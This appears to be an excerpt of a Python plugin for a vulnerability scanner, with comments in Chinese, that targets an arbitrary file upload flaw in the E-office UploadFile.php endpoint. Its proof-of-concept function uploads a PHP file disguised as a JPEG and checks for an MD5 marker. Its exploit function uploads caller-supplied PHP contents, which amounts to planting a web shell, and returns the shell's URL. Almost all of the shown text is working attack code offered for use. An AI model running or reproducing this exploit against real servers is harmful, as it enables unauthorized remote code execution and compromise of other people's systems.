...
def vuln_info():
    info={
        'vuln_name': 'E-office UploadFile.php文件上传',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        files = {
            'Filedata': ('cmd.php', "<?php echo(md5(123456));?>", 'image/jpeg')
        }
        requests.post(url + '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=',files=files,verify=False,timeout=10,headers=heads)
        getfile = requests.get(url + '/images/logo/logo-eoffice.php', headers=heads, timeout=10,verify=False)
        if "e10adc3949ba59abbe56e057f20f883e" in getfile.text:
            result['Result'] =True
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type'] == 'uploadfile':
            files = {
                'Filedata': ('cmd.php', exp_data['filename_contents'], 'image/jpeg')
            }
            requests.post(url + '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=',files=files, verify=False, timeout=10, headers=heads)
            getfile = requests.get(url + '/images/logo/logo-eoffice.php', headers=heads, timeout=10, verify=False)
            if 200 == getfile.status_code:
                result['Result'] = True
                result['Result_Info'] = '上传成功\n上传路径为:'+url+'/images/logo/logo-eoffice.php'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
